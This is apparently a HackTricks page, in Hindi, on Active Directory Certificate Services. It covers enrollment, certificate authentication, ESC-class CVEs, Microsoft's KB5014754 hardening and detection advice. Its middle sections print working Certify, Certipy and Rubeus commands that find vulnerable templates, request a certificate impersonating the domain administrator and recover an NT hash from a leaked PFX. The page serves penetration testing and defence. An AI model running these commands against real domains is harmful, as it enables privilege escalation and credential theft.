# AD Certificates

{{#include ../../banners/hacktricks-training.md}}

## परिचय

### Certificate के घटक

- Certificate का **Subject** उसके मालिक को दर्शाता है।
- **Public Key** को निजी तौर पर रखी गई key के साथ जोड़ा जाता है, ताकि certificate को उसके सही मालिक से जोड़ा जा सके।
- **Validity Period**, जिसे **NotBefore** और **NotAfter** तारीखों से परिभाषित किया जाता है, certificate की प्रभावी अवधि बताता है।
- Certificate Authority (CA) द्वारा दिया गया अद्वितीय **Serial Number**, हर certificate की पहचान करता है।
- **Issuer** उस CA को दर्शाता है जिसने certificate जारी किया है।
- **SubjectAlternativeName** subject के लिए अतिरिक्त नामों की अनुमति देता है, जिससे पहचान की सुविधा बढ़ती है।
- **Basic Constraints** बताते हैं कि certificate किसी CA के लिए है या किसी end entity के लिए, और उपयोग से जुड़ी पाबंदियाँ परिभाषित करते हैं।
- **Extended Key Usages (EKUs)** Object Identifiers (OIDs) के ज़रिए certificate के खास उद्देश्यों, जैसे code signing या email encryption, को निर्धारित करते हैं।
- **Signature Algorithm** certificate पर हस्ताक्षर करने का तरीका बताता है।
- Issuer की निजी key से बनाया गया **Signature**, certificate की प्रामाणिकता सुनिश्चित करता है।<sup>[[4]](#references)</sup>

### विशेष ध्यान देने योग्य बातें

- **Subject Alternative Names (SANs)** किसी certificate को कई identities के लिए उपयोगी बनाते हैं, जो कई domains वाले servers के लिए अहम है। SAN specification में बदलाव करके attackers द्वारा impersonation करने के जोखिम से बचने के लिए सुरक्षित issuance प्रक्रियाएँ बेहद ज़रूरी हैं।<sup>[[4]](#references)</sup>

### Active Directory (AD) में Certificate Authorities (CAs)

AD CS, AD forest में CA certificates को निर्धारित containers के ज़रिए पहचानता है; हर container की भूमिका अलग होती है:<sup>[[4]](#references)</sup>

- **Certification Authorities** container में trusted root CA certificates होते हैं।
- **Enrolment Services** container में Enterprise CAs और उनके certificate templates की जानकारी होती है।
- **NTAuthCertificates** object में AD authentication के लिए अधिकृत CA certificates होते हैं।
- **AIA (Authority Information Access)** container intermediate और cross CA certificates के साथ certificate chain validation को सुगम बनाता है।

### Certificate प्राप्त करना: Client Certificate Request Flow

1. Request की प्रक्रिया तब शुरू होती है जब clients किसी Enterprise CA को खोजते हैं।
2. Public-private key pair बनाने के बाद, public key और अन्य विवरणों वाला CSR तैयार किया जाता है।
3. CA, CSR का उपलब्ध certificate templates से मिलान करके आकलन करता है और template की permissions के आधार पर certificate जारी करता है।
4. मंज़ूरी मिलने पर, CA अपनी निजी key से certificate पर हस्ताक्षर करके उसे client को लौटाता है।<sup>[[4]](#references)</sup>

### Certificate Templates

AD में परिभाषित ये templates certificates जारी करने की settings और permissions तय करते हैं। इनमें अनुमत EKUs तथा enrollment या modification rights शामिल हैं, जो certificate services तक पहुँच प्रबंधित करने के लिए अहम हैं।<sup>[[4]](#references)</sup>

**Template schema version मायने रखता है।** Legacy **v1** templates (उदाहरण के लिए, अंतर्निहित **WebServer** template) में कई आधुनिक enforcement controls नहीं होते। **ESC15/EKUwu** research से पता चला कि **v1 templates** पर requester CSR में **Application Policies/EKUs** शामिल कर सकता है, जिन्हें template में configured EKUs से **ज़्यादा प्राथमिकता** मिलती है। इससे केवल enrollment rights के साथ client-auth, enrollment agent या code-signing certificates प्राप्त किए जा सकते हैं। **v2/v3 templates** को प्राथमिकता दें, v1 defaults हटाएँ या उनकी जगह नए templates लागू करें, और EKUs को उनके निर्धारित उद्देश्य तक सीमित रखें।<sup>[[1]](#references)</sup>

## Certificate Enrollment

Certificates की enrollment प्रक्रिया तब शुरू होती है जब administrator **certificate template बनाता है**, जिसे फिर Enterprise Certificate Authority (CA) **publish** करता है। इससे template client enrollment के लिए उपलब्ध हो जाता है। इसके लिए Active Directory object के `certificatetemplates` field में template का नाम जोड़ा जाता है।<sup>[[4]](#references)</sup>

Client को certificate request करने के लिए **enrollment rights** देना ज़रूरी है। ये rights certificate template और स्वयं Enterprise CA पर मौजूद security descriptors से परिभाषित होते हैं। Request सफल होने के लिए दोनों जगह permissions देना आवश्यक है।<sup>[[4]](#references)</sup>

### Template Enrollment Rights

ये rights Access Control Entries (ACEs) के ज़रिए निर्दिष्ट किए जाते हैं, जिनमें निम्न जैसी permissions का विवरण होता है:<sup>[[4]](#references)</sup>

- **Certificate-Enrollment** और **Certificate-AutoEnrollment** rights, जिनमें से हर एक विशिष्ट GUID से जुड़ा होता है।
- **ExtendedRights**, जो सभी extended permissions की अनुमति देता है।
- **FullControl/GenericAll**, जो template पर पूरा नियंत्रण देता है।

### Enterprise CA Enrollment Rights

CA के rights उसके security descriptor में बताए जाते हैं, जिसे Certificate Authority management console से देखा जा सकता है। कुछ settings low-privileged users को remote access भी देती हैं, जो सुरक्षा के लिए चिंता का विषय हो सकता है।<sup>[[4]](#references)</sup>

### अतिरिक्त Issuance Controls

कुछ controls लागू हो सकते हैं, जैसे:<sup>[[4]](#references)</sup>

- **Manager Approval**: Request को pending स्थिति में रखता है, जब तक certificate manager उसे मंज़ूरी न दे।
- **Enrolment Agents and Authorized Signatures**: CSR पर आवश्यक signatures की संख्या और ज़रूरी Application Policy OIDs निर्दिष्ट करते हैं।

### Certificates Request करने के तरीके

Certificates के लिए इन तरीकों से request किया जा सकता है:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), DCOM interfaces का उपयोग करके।
2. **ICertPassage Remote Protocol** (MS-ICPR), named pipes या TCP/IP के ज़रिए।
3. **Certificate Authority Web Enrollment** role install होने पर, **certificate enrollment web interface** के ज़रिए।
4. **Certificate Enrollment Service** (CES), Certificate Enrollment Policy (CEP) service के साथ।
5. Network devices के लिए **Network Device Enrollment Service** (NDES), Simple Certificate Enrollment Protocol (SCEP) का उपयोग करके।

Windows users GUI (`certmgr.msc` या `certlm.msc`) या command-line tools (`certreq.exe` या PowerShell के `Get-Certificate` command) के ज़रिए भी certificates request कर सकते हैं।

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## प्रमाणपत्र प्रमाणीकरण

Active Directory (AD), मुख्य रूप से **Kerberos** और **Secure Channel (Schannel)** प्रोटोकॉल का उपयोग करके certificate authentication का समर्थन करता है।<sup>[[4]](#references)</sup>

### Kerberos प्रमाणीकरण प्रक्रिया

Kerberos प्रमाणीकरण प्रक्रिया में, उपयोगकर्ता द्वारा Ticket Granting Ticket (TGT) के लिए किया गया अनुरोध, उपयोगकर्ता के certificate की **private key** का उपयोग करके हस्ताक्षरित किया जाता है। यह अनुरोध domain controller द्वारा कई जाँचों से गुजरता है, जिनमें certificate की **वैधता**, **पथ**, और **निरस्तीकरण स्थिति** शामिल हैं। जाँचों में यह सत्यापित करना भी शामिल है कि certificate किसी विश्वसनीय स्रोत से आया है और यह पुष्टि करना कि जारीकर्ता **NTAUTH certificate store** में मौजूद है। जाँच सफल होने पर TGT जारी किया जाता है। AD में **`NTAuthCertificates`** object, जो यहाँ स्थित है:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

certificate authentication के लिए trust स्थापित करने में केंद्रीय भूमिका निभाता है।<sup>[[4]](#references)</sup>

**KB5014754** rollout के बाद से, modern Kerberos certificate auth मुख्यतः **mapping strength** पर निर्भर करता है, केवल EKUs पर नहीं।<sup>[[2]](#references)</sup> Hardened forests में:

- केवल **UPN/DNS SAN** वाला certificate अब logon के लिए पर्याप्त नहीं हो सकता।
- KDC **strong binding** को प्राथमिकता देता है, आमतौर पर **SID security extension** (`1.3.6.1.4.1.311.25.2`) या `altSecurityIdentities` में strong explicit mapping।
- यदि cert में strong mapping नहीं है, तो compatibility mode में DCs **Kdcsvc Event ID 39/41** log करते हैं और enforcement mode में auth अस्वीकार कर देते हैं।
- Mixed attack paths में **ESC9/ESC16** महत्वपूर्ण हैं, क्योंकि ये जारी किए गए certs से SID extension हटा देते हैं; इसके बाद operators explicit mappings या SAN URL SID formats पर निर्भर करते हैं, जहाँ attack path इनका समर्थन करता है।

### Secure Channel (Schannel) Authentication

Schannel secure TLS/SSL connections की सुविधा देता है। Handshake के दौरान client एक certificate प्रस्तुत करता है, जो सफलतापूर्वक validate होने पर access अधिकृत करता है।<sup>[[5]](#references)</sup> Certificate को AD account से map करने में Kerberos का **S4U2Self** function या certificate का **Subject Alternative Name (SAN)**, अन्य तरीकों के साथ, शामिल हो सकता है।<sup>[[4]](#references)</sup>

**PKINIT** उपलब्ध न होने पर Schannel एक व्यावहारिक fallback भी है। उदाहरण के लिए, यदि domain controller के पास उपयुक्त **Smart Card Logon** certificate नहीं है, तो `certipy auth`/PKINIT tooling TGT प्राप्त करने में विफल हो सकती है, लेकिन वही certificate authentication और LDAP operations के लिए **LDAPS** या **LDAP StartTLS** के विरुद्ध फिर भी उपयोगी हो सकता है।

### AD Certificate Services Enumeration

AD की certificate services को LDAP queries के माध्यम से enumerate किया जा सकता है, जिससे **Enterprise Certificate Authorities (CAs)** और उनके configurations की जानकारी मिलती है। यह बिना विशेष privileges के किसी भी domain-authenticated user के लिए सुलभ है।<sup>[[4]](#references)</sup> **[Certify](https://github.com/GhostPack/Certify)** और **[Certipy](https://github.com/ly4k/Certipy)** जैसे tools का उपयोग AD CS environments में enumeration और vulnerability assessment के लिए किया जाता है।<sup>[[6]](#references)</sup>

इन tools को इस्तेमाल करने के commands में शामिल हैं:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Certify enumeration flags और Rubeus के साथ PKINIT

नीचे दिए गए Certify command variants अपने अलग-अलग filters और output options बनाए रखते हैं।<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus, PKINIT authentication के लिए password-protected PFX certificate का उपयोग भी कर सकता है और TGT का अनुरोध कर सकता है। वैकल्पिक `/getcredentials` switch, U2U service ticket का अनुरोध करता है और account का NT hash पुनर्प्राप्त करने का प्रयास करता है:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

ESC-विशिष्ट template और CA abuse के लिए, [AD CS Domain Escalation](ad-certificates/domain-escalation.md) देखें।

---

## हाल की Vulnerabilities और Security Updates (2022-2025)

| वर्ष | ID / नाम | प्रभाव | मुख्य बातें |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | PKINIT के दौरान machine account certificates को spoof करके *Privilege escalation*। | Patch **May 10 2022** के security updates में शामिल है। Auditing और strong-mapping controls **KB5014754** के ज़रिए शुरू किए गए थे; अब environments को *Full Enforcement* mode में होना चाहिए।  |
| 2023 | **CVE-2023-35350 / 35351** | AD CS Web Enrollment (certsrv) और CES roles में *Remote code-execution*। | सार्वजनिक PoCs सीमित हैं, लेकिन vulnerable IIS components अक्सर आंतरिक रूप से exposed होते हैं। **July 2023** Patch Tuesday तक patch करें।  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | **v1 templates** पर, enrollment rights वाला requester CSR में **Application Policies/EKUs** embed कर सकता है, जिन्हें template EKUs पर प्राथमिकता मिलती है। इससे client-auth, enrollment agent, या code-signing certificates बन सकते हैं। | **November 12, 2024** तक patch किया गया। v1 templates (जैसे default WebServer) को बदलें या supersede करें, EKUs को उनके उद्देश्य तक सीमित करें, और enrollment rights सीमित करें। |

### Microsoft की hardening timeline (KB5014754)

Microsoft ने Kerberos certificate authentication को weak implicit mappings से हटाने के लिए तीन चरणों (Compatibility → Audit → Enforcement) वाला rollout शुरू किया। **February 11, 2025** से, यदि `StrongCertificateBindingEnforcement` registry value सेट नहीं है, तो domain controllers अपने-आप **Full Enforcement** पर स्विच हो जाते हैं। Microsoft ने बाद में timeline अपडेट की, ताकि **September 9, 2025** security update तक compatibility mode पर fallback संभव रहे।<sup>[[2]](#references)</sup> Administrators को चाहिए कि वे:

1. सभी DCs और AD CS servers को patch करें (May 2022 या उसके बाद के updates)।
2. *Audit* phase के दौरान weak mappings के लिए Event ID 39/41 की निगरानी करें।
3. Enforcement द्वारा weak mappings को block करने से पहले, नए **SID extension** के साथ client-auth certificates दोबारा जारी करें या strong manual mappings configure करें।

### Hardened forests के लिए Operator notes

- 2025+ environments में **ESC1/ESC6 अकेले पूरी कहानी नहीं हैं**। यदि आप किसी अन्य principal के लिए cert request करते हैं, तो आमतौर पर आपको SID extension या explicit mapping जैसे strong mapping artifact की भी ज़रूरत होती है।
- **ESC15 (EKUwu)** unpatched environments में सबसे उपयोगी है, क्योंकि यह **Application Policies** inject करके **WebServer** जैसे harmless **v1** templates को authentication- या enrollment-agent-capable certs में बदल देता है। Kerberos PKINIT अब भी EKUs का मूल्यांकन करता है, लेकिन **LDAP Schannel** Application Policies को भी मानता है, जिससे LDAP-आधारित abuse प्रासंगिक बना रहता है।<sup>[[1]](#references)</sup>
- **ESC16** CA-wide knob है: यदि CA SID security extension को globally disable करता है, तो जारी किया गया हर certificate weaker mapping behavior की ओर लौट जाता है—जब तक कि attack chain किसी अन्य supported format से SID inject न करे।
- **ESC7 rights अलग-अलग हैं:** CA पर `ManageCA` grant से `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) जैसी settings बदली जा सकती हैं, जबकि `ManageCertificates` request approval को नियंत्रित करता है। Certificate-manager rights पर explicit Deny उस approval route को block कर सकता है, भले ही Allow भी मौजूद हो; settings और templates को chain करने से पहले प्रभावी CA ACL का आकलन करें। [Microsoft का CA ACL assessment](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting) देखें।

---

## Detection और Hardening में सुधार

* **Defender for Identity AD CS sensor (2023-2024)** अब ESC1-ESC8/ESC11 के लिए posture assessments दिखाता है और real-time alerts बनाता है, जैसे *“Domain-controller certificate issuance for a non-DC”* (ESC8) और *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15)। इन detections का लाभ पाने के लिए सभी AD CS servers पर sensors deploy करें।<sup>[[3]](#references)</sup>
* सभी templates पर **“Supply in the request”** option को disable करें या इसका scope सख्ती से सीमित करें; स्पष्ट रूप से परिभाषित SAN/EKU values को प्राथमिकता दें।
* Templates से **Any Purpose** या **No EKU** हटाएँ, जब तक कि उनकी बिल्कुल ज़रूरत न हो (इससे ESC2 scenarios का समाधान होता है)।
* संवेदनशील templates (जैसे WebServer / CodeSigning) के लिए **manager approval** या dedicated Enrollment Agent workflows अनिवार्य करें।
* Web enrollment (`certsrv`) और CES/NDES endpoints को trusted networks तक सीमित करें या client-certificate authentication के पीछे रखें।
* ESC11 (RPC relay) को कम करने के लिए RPC enrollment encryption लागू करें (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`)। यह flag **default रूप से on** होता है, लेकिन legacy clients के लिए अक्सर disable किया जाता है, जिससे relay का जोखिम फिर से पैदा होता है।
* **IIS-आधारित enrollment endpoints** (CES/Certsrv) को सुरक्षित करें: जहाँ संभव हो NTLM disable करें या ESC8 relays block करने के लिए HTTPS + Extended Protection अनिवार्य करें।

ESC11 का आकलन उस host पर करें जहाँ CA चल रहा है; यह domain controller के बजाय domain member server भी हो सकता है। Active CA का `InterfaceFlags`, `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` के अंतर्गत पढ़ें; unreadable या missing value का अर्थ unknown result है, यह RPC encryption के disabled होने का प्रमाण नहीं है। `IF_ENFORCEENCRYPTICERTREQUEST` bit clear होना configuration से जुड़ा एक संकेत है; फिर भी इसके लिए reachable enrollment RPC endpoint, coercible credentials और उपयोगी certificate template की ज़रूरत होती है। ESC8 के लिए, केवल HTTP NTLM challenge पर्याप्त नहीं है: पुष्टि करें कि काम करने वाला enrollment endpoint मौजूद है।

---

## References

- [1] [EKUwu: सिर्फ़ एक और AD CS ESC नहीं](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Windows domain controllers पर certificate-based authentication में बदलाव](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Certificates के security posture assessments - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Active Directory Certificate Services का दुरुपयोग](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [SSL/TLS Client Authentication क्या है और यह कैसे काम करता है?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
